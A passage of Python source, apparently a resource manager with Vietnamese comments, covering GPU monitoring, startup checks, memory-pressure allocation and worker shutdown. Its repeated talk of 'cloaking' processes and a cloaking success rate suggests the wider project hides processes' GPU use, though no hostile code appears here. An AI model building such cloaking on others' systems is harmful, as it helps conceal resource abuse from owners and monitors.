                self.logger.info(f"📡 [GPU MONITOR] Monitoring active status: {is_monitoring}")
                
                if is_monitoring:
                    self.logger.info("🎯 [GPU MONITOR] MONITORING ACTIVATION SUCCESS - GPU monitoring is now active")
                else:
                    self.logger.warning("⚠️ [GPU MONITOR] MONITORING NOT ACTIVE - Manual activation may be required")
            else:
                self.logger.error("❌ [GPU MONITOR] CRITICAL: Monitor initialization failed - gpu_monitor is None")
            
        except ImportError as e:
            self.logger.error(f"❌ [GPU MONITOR] Could not import GPU monitoring system: {e}")
            self.logger.error("💡 [GPU MONITOR] Check if gpu_resource_monitor.py exists and is accessible")
        except Exception as e:
            self.logger.error(f"❌ [GPU MONITOR] Failed to initialize GPU monitoring: {e}")
            self.logger.error(f"🔍 [GPU MONITOR] Exception details: {type(e).__name__}: {str(e)}")
            import traceback
            self.logger.error(f"📋 [GPU MONITOR] Full traceback: {traceback.format_exc()}")

    def _periodic_gpu_health_check(self) -> None:
        """
        **Periodic GPU Health Check** (kiểm tra sức khỏe GPU định kỳ)
        
        Được gọi trong main monitoring loop để thực hiện health checks
        """
        try:
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                # ✅ PERFORM HEALTH CHECK: Thực hiện health check
                health_metrics = self.gpu_monitor.perform_health_check()
                
                # ✅ LOG CRITICAL ISSUES: Log các vấn đề nghiêm trọng
                if not health_metrics.manager_active:
                    self.logger.error("🚨 [GPU HEALTH] CRITICAL: GPU Manager is not active!")
                elif not health_metrics.nvml_initialized:
                    self.logger.warning("⚠️ [GPU HEALTH] WARNING: NVML is not initialized")
                elif health_metrics.temperature_celsius > 80:
                    self.logger.warning(f"🌡️ [GPU HEALTH] WARNING: High temperature: {health_metrics.temperature_celsius}°C")
                elif health_metrics.cloaking_success_rate < 90:
                    self.logger.warning(f"📉 [GPU HEALTH] WARNING: Low success rate: {health_metrics.cloaking_success_rate:.1f}%")
                else:
                    # ✅ PERIODIC SUCCESS LOG: Log thành công định kỳ (mỗi 10 lần)
                    if self.gpu_monitor.manager_status.total_operations % 10 == 0:
                        self.logger.info(f"✅ [GPU HEALTH] All systems healthy - {health_metrics.processes_cloaked} processes cloaked")
                
        except Exception as e:
            self.logger.error(f"❌ [GPU HEALTH] Health check failed: {e}")

    def _perform_startup_validation_checkpoints(self) -> None:
        """
        **Perform Startup Validation Checkpoints** (thực hiện các checkpoint xác thực khởi động)
        
        Comprehensive validation để đảm bảo tất cả systems hoạt động correctly
        """
        try:
            self.logger.info("🔍 [STARTUP VALIDATION] Starting comprehensive startup validation checkpoints...")
            
            # ✅ CHECKPOINT 1: Factory Registration Verification
            self.logger.info("1️⃣ [CHECKPOINT] Factory registration verification...")
            try:
                from .resource_control import ResourceControlFactory
                sharing_info = ResourceControlFactory.get_shared_managers_info()
                total_configs = sharing_info.get('total_configs', 0)
                managers_per_config = sharing_info.get('managers_per_config', {})
                
                self.logger.info(f"✅ [FACTORY CHECKPOINT] Factory configs: {total_configs}")
                self.logger.info(f"📋 [FACTORY CHECKPOINT] Managers per config: {managers_per_config}")
                
                # ✅ VERIFY GPU MANAGER REGISTRATION
                gpu_manager_found = False
                for config_hash, managers in managers_per_config.items():
                    if 'gpu' in managers:
                        gpu_manager_found = True
                        self.logger.info(f"✅ [FACTORY CHECKPOINT] GPU manager registered in config {config_hash}")
                        break
                
                if not gpu_manager_found:
                    self.logger.error("❌ [FACTORY CHECKPOINT] CRITICAL: No GPU manager found in any factory config")
                else:
                    self.logger.info("✅ [FACTORY CHECKPOINT] GPU manager registration verified successfully")
                    
            except Exception as factory_err:
                self.logger.error(f"❌ [FACTORY CHECKPOINT] Factory verification failed: {factory_err}")
            
            # ✅ CHECKPOINT 2: Shared Resource Manager Verification
            self.logger.info("2️⃣ [CHECKPOINT] Shared resource manager verification...")
            if self.shared_resource_manager:
                if hasattr(self.shared_resource_manager, 'resource_managers'):
                    available_managers = list(self.shared_resource_manager.resource_managers.keys())
                    self.logger.info(f"✅ [SHARED CHECKPOINT] Available managers: {available_managers}")
                    
                    if 'gpu' in available_managers:
                        self.logger.info("✅ [SHARED CHECKPOINT] GPU manager accessible via shared manager")
                    else:
                        self.logger.error("❌ [SHARED CHECKPOINT] GPU manager NOT accessible via shared manager")
                else:
                    self.logger.warning("⚠️ [SHARED CHECKPOINT] Shared manager missing resource_managers attribute")
            else:
                self.logger.error("❌ [SHARED CHECKPOINT] CRITICAL: No shared resource manager instance")
            
            # ✅ CHECKPOINT 3: GPU Monitoring System Verification
            self.logger.info("3️⃣ [CHECKPOINT] GPU monitoring system verification...")
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                self.logger.info("✅ [MONITOR CHECKPOINT] GPU monitor instance exists")
                
                # ✅ CHECK MONITORING STATUS
                is_monitoring = getattr(self.gpu_monitor, 'is_monitoring', False)
                has_gpu_manager = getattr(self.gpu_monitor, 'gpu_manager', None) is not None
                
                self.logger.info(f"📡 [MONITOR CHECKPOINT] Monitoring active: {is_monitoring}")
                self.logger.info(f"🎮 [MONITOR CHECKPOINT] GPU manager attached: {has_gpu_manager}")
                
                if is_monitoring and has_gpu_manager:
                    self.logger.info("🎯 [MONITOR CHECKPOINT] ✅ MONITORING FULLY OPERATIONAL")
                elif has_gpu_manager and not is_monitoring:
                    self.logger.warning("⚠️ [MONITOR CHECKPOINT] GPU manager attached but monitoring not active")
                else:
                    self.logger.error("❌ [MONITOR CHECKPOINT] CRITICAL: GPU monitoring not properly configured")
            else:
                self.logger.error("❌ [MONITOR CHECKPOINT] CRITICAL: No GPU monitor instance found")
                self.logger.error("💡 [MONITOR CHECKPOINT] GPU monitoring system was not initialized properly")
            
            # ✅ CHECKPOINT 4: GPU Manager Direct Access Test
            self.logger.info("4️⃣ [CHECKPOINT] GPU manager direct access test...")
            if self.shared_resource_manager and hasattr(self.shared_resource_manager, 'resource_managers'):
                gpu_manager = self.shared_resource_manager.resource_managers.get('gpu')
                if gpu_manager:
                    try:
                        gpu_count = gpu_manager.get_gpu_count()
                        nvml_status = gpu_manager.is_nvml_initialized()
                        self.logger.info(f"✅ [GPU ACCESS CHECKPOINT] Direct GPU access: GPUs={gpu_count}, NVML={nvml_status}")
                    except Exception as gpu_access_err:
                        self.logger.error(f"❌ [GPU ACCESS CHECKPOINT] GPU manager access failed: {gpu_access_err}")
                else:
                    self.logger.error("❌ [GPU ACCESS CHECKPOINT] GPU manager not accessible")
            
            # ✅ FINAL VALIDATION SUMMARY
            self.logger.info("🏁 [STARTUP VALIDATION] Startup validation checkpoints completed")
            
        except Exception as e:
            self.logger.error(f"❌ [STARTUP VALIDATION] Startup validation failed: {e}")
            import traceback
            self.logger.error(f"📋 [STARTUP VALIDATION] Validation traceback: {traceback.format_exc()}")

    def register_process_for_monitoring(self, pid: int, process_info: Dict[str, Any]) -> None:
        """
        **Register Process for GPU Monitoring** (đăng ký tiến trình cho giám sát GPU)
        
        Args:
            pid: Process ID
            process_info: Thông tin tiến trình
        """
        try:
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                self.gpu_monitor.register_cloaked_process(pid, process_info)
                self.logger.info(f"📋 [GPU MONITOR] Process PID={pid} registered for monitoring")
        except Exception as e:
            self.logger.error(f"❌ [GPU MONITOR] Failed to register process PID={pid}: {e}")

    def unregister_process_from_monitoring(self, pid: int) -> None:
        """
        **Unregister Process from GPU Monitoring** (hủy đăng ký tiến trình khỏi giám sát GPU)
        
        Args:
            pid: Process ID
        """
        try:
            if hasattr(self, 'gpu_monitor') and self.gpu_monitor:
                self.gpu_monitor.unregister_cloaked_process(pid)
                self.logger.info(f"🗑️ [GPU MONITOR] Process PID={pid} unregistered from monitoring")
        except Exception as e:
            self.logger.error(f"❌ [GPU MONITOR] Failed to unregister process PID={pid}: {e}")

    # ===== PROGRESSIVE MEMORY ALLOCATION SYSTEM =====
    
    def allocate_memory_progressive(self, required_mb: int) -> Dict[str, Any]:
        """
        **Progressive Memory Allocation** (cấp phát bộ nhớ tiến tiến)
        
        Allocate memory progressively with safety checks based on current memory pressure.
        This prevents memory exhaustion that leads to std::bad_alloc.
        
        Args:
            required_mb: Required memory in MB (bộ nhớ yêu cầu tính bằng MB)
            
        Returns:
            Dict with allocation result: {
                'success': bool,
                'allocated_mb': int,
                'strategy': str,
                'memory_pressure': float,
                'safety_action': str
            }
        """
        try:
            # **Get current memory pressure** (lấy áp lực bộ nhớ hiện tại)
            memory_info = psutil.virtual_memory()
            current_usage = memory_info.percent
            available_mb = memory_info.available / (1024 * 1024)
            
            self.logger.info(f"🔍 [PROGRESSIVE ALLOCATION] Request: {required_mb}MB, Current usage: {current_usage:.1f}%")
            
            # **Critical threshold check** (kiểm tra ngưỡng quan trọng)
            if current_usage > 85:
                self.logger.warning(f"🚨 [MEMORY PRESSURE] Critical threshold exceeded: {current_usage:.1f}% > 85%")
                return self.reduce_memory_footprint(required_mb)
            
            # **Conservative allocation zone** (vùng cấp phát thận trọng)
            elif current_usage > 75:
                self.logger.warning(f"⚠️ [MEMORY PRESSURE] Conservative zone: {current_usage:.1f}% > 75%")
                return self.allocate_conservative(required_mb)
            
            # **Normal allocation zone** (vùng cấp phát bình thường)
            else:
                self.logger.info(f"✅ [MEMORY PRESSURE] Normal zone: {current_usage:.1f}% ≤ 75%")
                return self.allocate_normal(required_mb)
                
        except Exception as e:
            self.logger.error(f"❌ [PROGRESSIVE ALLOCATION] Error during progressive allocation: {e}")
            return {
                'success': False,
                'allocated_mb': 0,
                'strategy': 'error',
                'memory_pressure': 0.0,
                'safety_action': f'allocation_failed: {e}'
            }
    
    def reduce_memory_footprint(self, required_mb: int) -> Dict[str, Any]:
        """
        **Reduce Memory Footprint** (giảm dung lượng bộ nhớ)
        
        Emergency memory management when system pressure > 85%.
        Attempts to free memory before allocation.
        
        Args:
            required_mb: Required memory in MB (bộ nhớ yêu cầu)
            
        Returns:
            Dict with reduction result (từ điển với kết quả giảm)
        """
        try:
            memory_before = psutil.virtual_memory()
            self.logger.warning(f"🚨 [MEMORY REDUCTION] Emergency mode activated: {memory_before.percent:.1f}%")
            
            # **Step 1: Drop system caches** (bước 1: xóa cache hệ thống)
            if hasattr(self.shared_resource_manager, 'resource_managers'):
                cache_manager = self.shared_resource_manager.resource_managers.get('cache')
                if cache_manager and hasattr(cache_manager, 'drop_caches'):
                    cache_dropped = cache_manager.drop_caches()
                    if cache_dropped:
                        self.logger.info("🧹 [MEMORY REDUCTION] System caches dropped")
            
            # **Step 2: Force garbage collection** (bước 2: buộc thu gom rác)
            import gc
            collected = gc.collect()
            self.logger.info(f"🗑️ [MEMORY REDUCTION] Garbage collection: {collected} objects collected")
            
            # **Step 3: Check if sufficient memory freed** (bước 3: kiểm tra nếu đủ bộ nhớ được giải phóng)
            memory_after = psutil.virtual_memory()
            memory_freed_mb = (memory_before.used - memory_after.used) / (1024 * 1024)
            
            self.logger.info(f"📊 [MEMORY REDUCTION] Freed: {memory_freed_mb:.1f}MB, Usage: {memory_after.percent:.1f}%")
            
            # **Step 4: Decide allocation strategy** (bước 4: quyết định chiến lược cấp phát)
            if memory_after.percent < 80:  # Significant improvement
                self.logger.info("✅ [MEMORY REDUCTION] Sufficient memory freed - proceeding with conservative allocation")
                return self.allocate_conservative(required_mb)
            else:
                # **Emergency allocation with severe reduction** (cấp phát khẩn cấp với giảm nghiêm trọng)
                emergency_mb = min(required_mb * 0.5, memory_after.available / (1024 * 1024) * 0.1)
                self.logger.warning(f"🆘 [MEMORY REDUCTION] Emergency allocation: {emergency_mb:.1f}MB (reduced from {required_mb}MB)")
                
                return {
                    'success': True,
                    'allocated_mb': int(emergency_mb),
                    'strategy': 'emergency_reduced',
                    'memory_pressure': memory_after.percent,
                    'safety_action': f'reduced_allocation_from_{required_mb}MB_to_{emergency_mb:.1f}MB'
                }
                
        except Exception as e:
            self.logger.error(f"❌ [MEMORY REDUCTION] Error during memory reduction: {e}")
            return {
                'success': False,
                'allocated_mb': 0,
                'strategy': 'reduction_failed',
                'memory_pressure': 100.0,
                'safety_action': f'reduction_failed: {e}'
            }
    
    def allocate_conservative(self, required_mb: int) -> Dict[str, Any]:
        """
        **Conservative Memory Allocation** (cấp phát bộ nhớ thận trọng)
        
        Conservative allocation strategy when memory pressure is 75-85%.
        Allocates 80% of requested memory with safety margins.
        
        Args:
            required_mb: Required memory in MB (bộ nhớ yêu cầu)
            
        Returns:
            Dict with allocation result (từ điển với kết quả cấp phát)
        """
        try:
            memory_info = psutil.virtual_memory()
            
            # **Conservative allocation: 80% of requested** (cấp phát thận trọng: 80% yêu cầu)
            conservative_mb = int(required_mb * 0.8)
            available_mb = memory_info.available / (1024 * 1024)
            
            # **Safety check: ensure allocation doesn't exceed 10% of available** (kiểm tra an toàn)
            max_safe_mb = int(available_mb * 0.1)
            final_allocation = min(conservative_mb, max_safe_mb)
            
            self.logger.info(f"⚖️ [CONSERVATIVE ALLOCATION] Requested: {required_mb}MB → Allocated: {final_allocation}MB")
            self.logger.info(f"📊 [CONSERVATIVE ALLOCATION] Available: {available_mb:.1f}MB, Safety limit: {max_safe_mb}MB")
            
            return {
                'success': True,
                'allocated_mb': final_allocation,
                'strategy': 'conservative',
                'memory_pressure': memory_info.percent,
                'safety_action': f'reduced_to_80%_with_safety_limit'
            }
            
        except Exception as e:
            self.logger.error(f"❌ [CONSERVATIVE ALLOCATION] Error during conservative allocation: {e}")
            return {
                'success': False,
                'allocated_mb': 0,
                'strategy': 'conservative_failed',
                'memory_pressure': 0.0,
                'safety_action': f'conservative_failed: {e}'
            }
    
    def allocate_normal(self, required_mb: int) -> Dict[str, Any]:
        """
        **Normal Memory Allocation** (cấp phát bộ nhớ bình thường)
        
        Normal allocation strategy when memory pressure < 75%.
        Allocates full requested memory with basic safety checks.
        
        Args:
            required_mb: Required memory in MB (bộ nhớ yêu cầu)
            
        Returns:
            Dict with allocation result (từ điển với kết quả cấp phát)
        """
        try:
            memory_info = psutil.virtual_memory()
            available_mb = memory_info.available / (1024 * 1024)
            
            # **Normal allocation with safety margin** (cấp phát bình thường với biên an toàn)
            if required_mb <= available_mb * 0.2:  # Request ≤ 20% of available
                allocated_mb = required_mb
                safety_action = 'full_allocation_within_safety_margin'
            else:
                # **Large request: cap at 15% of available memory** (yêu cầu lớn: giới hạn 15% bộ nhớ khả dụng)
                allocated_mb = int(available_mb * 0.15)
                safety_action = f'capped_at_15%_available_memory'
            
            self.logger.info(f"✅ [NORMAL ALLOCATION] Requested: {required_mb}MB → Allocated: {allocated_mb}MB")
            self.logger.info(f"📊 [NORMAL ALLOCATION] Available: {available_mb:.1f}MB, Usage: {memory_info.percent:.1f}%")
            
            return {
                'success': True,
                'allocated_mb': allocated_mb,
                'strategy': 'normal',
                'memory_pressure': memory_info.percent,
                'safety_action': safety_action
            }
            
        except Exception as e:
            self.logger.error(f"❌ [NORMAL ALLOCATION] Error during normal allocation: {e}")
            return {
                'success': False,
                'allocated_mb': 0,
                'strategy': 'normal_failed',
                'memory_pressure': 0.0,
                'safety_action': f'normal_failed: {e}'
            }
    
    def monitor_memory_pressure(self) -> Dict[str, Any]:
        """
        **Memory Pressure Monitoring** (giám sát áp lực bộ nhớ)
        
        Continuous monitoring of system memory pressure with early warnings.
        Called periodically to detect memory pressure trends.
        
        Returns:
            Dict with monitoring data (từ điển với dữ liệu giám sát)
        """
        try:
            memory_info = psutil.virtual_memory()
            usage_percent = memory_info.percent
            available_gb = memory_info.available / (1024 ** 3)
            
            # **Determine pressure level** (xác định mức độ áp lực)
            if usage_percent > 85:
                pressure_level = 'CRITICAL'
                action_required = 'IMMEDIATE'
                self.logger.error(f"🚨 [MEMORY PRESSURE] CRITICAL: {usage_percent:.1f}% - Immediate action required")
            elif usage_percent > 75:
                pressure_level = 'HIGH'
                action_required = 'SOON'
                self.logger.warning(f"⚠️ [MEMORY PRESSURE] HIGH: {usage_percent:.1f}% - Action needed soon")
            elif usage_percent > 65:
                pressure_level = 'MODERATE'
                action_required = 'MONITOR'
                self.logger.info(f"ℹ️ [MEMORY PRESSURE] MODERATE: {usage_percent:.1f}% - Continue monitoring")
            else:
                pressure_level = 'LOW'
                action_required = 'NONE'
                self.logger.debug(f"✅ [MEMORY PRESSURE] LOW: {usage_percent:.1f}% - System healthy")
            
            return {
                'timestamp': time.time(),
                'usage_percent': usage_percent,
                'available_gb': available_gb,
                'pressure_level': pressure_level,
                'action_required': action_required,
                'total_gb': memory_info.total / (1024 ** 3),
                'used_gb': memory_info.used / (1024 ** 3)
            }
            
        except Exception as e:
            self.logger.error(f"❌ [MEMORY PRESSURE] Error during monitoring: {e}")
            return {
                'timestamp': time.time(),
                'usage_percent': 0.0,
                'available_gb': 0.0,
                'pressure_level': 'ERROR',
                'action_required': 'CHECK_SYSTEM',
                'error': str(e)
            }

    def shutdown(self):
        self.logger.info("Dừng ResourceManager... (BẮT ĐẦU)")

        # Bước 0: Chờ hàng đợi cloaking xử lý xong
        self.logger.info("Đợi xử lý xong các tác vụ trong resource_adjustment_queue.")
        self.resource_adjustment_queue.join()
        self.logger.info("Tất cả tác vụ resource_adjustment đã xử lý xong.")

        # Bước 1: Đặt cờ dừng
        self._stop_flag = True

        # Bước 2: Chờ thread "CloakingWorker" dừng
        start_time = time.time()
        timeout = 10
        self.logger.info(f"Chờ tối đa {timeout} giây để dừng CloakingWorker...")

        while time.time() - start_time < timeout:
            if all(not w.is_alive() for w in self.workers):
                self.logger.info("CloakingWorker đã dừng.")
                break
            time.sleep(2)
        else:
            self.logger.warning("CloakingWorker vẫn đang chạy sau thời gian chờ.")

        # Bước 3. Tắt NVML
        try:
            if self.shared_resource_manager:
                self.shared_resource_manager.shutdown_nvml()
                self.logger.info("NVML đã được tắt.")
            else:
                self.logger.warning("Không có shared_resource_manager, bỏ qua tắt NVML.")
        except Exception as e:
            self.logger.error(f"Lỗi khi tắt NVML: {e}")

        # Bước 4. join workers
        for w in self.workers:
            try:
                w.join(timeout=2)
                if w.is_alive():
                    self.logger.warning(f"Thread {w.name} chưa dừng hẳn.")
            except Exception as e:
                self.logger.error(f"Lỗi khi join thread {w.name}: {e}")

        self.logger.info("Dừng ResourceManager... (HOÀN THÀNH)")
    
    def _log_cache_metrics_if_needed(self) -> None:
        """
        ✅ CACHE METRICS: Log cache performance metrics if interval has passed.
        """
        try:
            current_time = time.time()
            if current_time - self.last_cache_metrics_log >= self.cache_metrics_interval:
                metrics = self.shared_resource_manager.strategy_cache.get_metrics()
                
                cache_perf = metrics['cache_performance']
                eviction_stats = metrics['eviction_stats']
                
                self.logger.info(
                    f"📊 [CacheMetrics] Hit rate: {cache_perf['hit_rate_percent']:.1f}% "
                    f"({cache_perf['cache_hits']}/{cache_perf['total_requests']} requests)"
                )
                
                self.logger.info(
                    f"📊 [CacheMetrics] Entries: {cache_perf['total_entries']}/{cache_perf['max_size']} "
                    f"({cache_perf['memory_usage_mb']:.1f}MB), "
                    f"Avg creation: {cache_perf['average_creation_time_ms']:.1f}ms"
                )
                
                if eviction_stats['total_evictions'] > 0:
                    self.logger.info(
                        f"📋 [CacheMetrics] Evictions: {eviction_stats['total_evictions']} "
                        f"(policy: {eviction_stats['eviction_policy']})"
                    )
                
                self.last_cache_metrics_log = current_time
                
        except Exception as e:
            # Don't let metrics logging interfere with main processing
            pass
    
    def get_cache_performance_report(self) -> Dict[str, Any]:
        """
        ✅ CACHE REPORT: Get comprehensive cache performance report.
        
        :return: Cache performance metrics dictionary
        """
        try:
            return self.shared_resource_manager.strategy_cache.get_metrics()
        except Exception as e:
            self.logger.error(f"❌ [CacheReport] Failed to get cache metrics: {e}")
            return {
                'error': str(e),
                'timestamp': time.time(),
                'cache_available': False
            }
